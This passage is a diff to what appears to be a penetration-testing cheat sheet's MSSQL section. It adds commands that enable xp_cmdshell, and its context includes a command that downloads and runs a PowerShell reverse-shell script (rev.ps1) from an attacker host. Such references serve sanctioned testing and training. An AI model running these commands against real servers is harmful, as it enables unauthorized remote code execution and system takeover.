@@ -240,7 +240,8 @@ To connect:
 To run shell commands if enabled:   
 
     SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';  #check if enabled    
-    xp_cmdshell 'whoami';
+    sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;    #configure and enable xp_cmdshell   
+    xp_cmdshell 'whoami';    
     EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/rev.ps1") | powershell -noprofile'   #exec PowerShell script   
 
 ### TCP Port 2049: NFS 
